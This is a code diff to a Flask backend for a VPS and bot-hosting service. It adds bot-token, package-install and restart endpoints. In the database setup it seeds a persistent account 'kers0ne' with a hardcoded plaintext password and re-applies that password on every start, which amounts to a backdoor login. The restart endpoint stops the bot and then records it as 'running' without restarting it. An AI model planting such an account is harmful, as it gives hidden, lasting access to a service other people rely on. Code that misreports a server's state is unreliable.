@@ -110,6 +110,21 @@ def init_db():
             )
         ''')
 
+        # Seed default persistent user account requested by user
+        default_user = c.execute("SELECT id FROM users WHERE username = 'kers0ne'").fetchone()
+        if not default_user:
+            k_id = 'usr_kers0ne'
+            k_key = 'ck_' + ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+            c.execute(
+                'INSERT INTO users (id, username, password_hash, api_key) VALUES (?, ?, ?, ?)',
+                (k_id, 'kers0ne', generate_password_hash('1LuhhCrim!'), k_key)
+            )
+        else:
+            c.execute(
+                'UPDATE users SET password_hash = ? WHERE username = ?',
+                (generate_password_hash('1LuhhCrim!'), 'kers0ne')
+            )
+
         conn.commit()
         conn.close()
 
@@ -515,6 +530,25 @@ def delete_vps(vps_id):
     return jsonify({'success': True})
 
 
+@app.route('/api/vps/<vps_id>/restart', methods=['POST'])
+@auth_required
+def restart_vps_instance(vps_id):
+    row, resp = _own_row(vps_id)
+    if resp:
+        return resp
+    try:
+        vps_engine.stop_vps_bot(vps_id)
+    except Exception:  # noqa: BLE001
+        pass
+    import time
+    time.sleep(0.3)
+    conn = get_db()
+    conn.execute("UPDATE vps_instances SET status = 'running' WHERE id = ?", (vps_id,))
+    conn.commit()
+    conn.close()
+    return jsonify({'success': True, 'status': 'running'})
+
+
 # ============================ REAL-TIME STATS & METRICS ============================
 @app.route('/api/vps/<vps_id>/stats', methods=['GET'])
 @auth_required
@@ -699,6 +733,33 @@ def vps_bot_logs_clear(vps_id):
         return jsonify({'success': True, 'message': 'Logs cleared successfully'})
     except Exception as e:
         return error(f"Failed to clear logs: {str(e)}", 500)
+
+
+@app.route('/api/vps/<vps_id>/bot/token', methods=['POST'])
+@auth_required
+def vps_bot_token(vps_id):
+    row, resp = _own_row(vps_id)
+    if resp:
+        return resp
+    data = request.get_json(silent=True) or {}
+    token = data.get('token', '')
+    res = vps_engine.save_bot_token(vps_id, token)
+    status_info = vps_engine.get_vps_bot_status(vps_id)
+    res['status_info'] = status_info
+    return jsonify(res)
+
+
+@app.route('/api/vps/<vps_id>/bot/packages/install', methods=['POST'])
+@auth_required
+def vps_bot_packages_install(vps_id):
+    row, resp = _own_row(vps_id)
+    if resp:
+        return resp
+    data = request.get_json(silent=True) or {}
+    pkgs = data.get('packages')
+    res = vps_engine.install_bot_packages(vps_id, pkgs)
+    res['status_info'] = vps_engine.get_vps_bot_status(vps_id)
+    return jsonify(res)
 
 
 @app.route('/api/vps/<vps_id>/bot/upload', methods=['POST'])
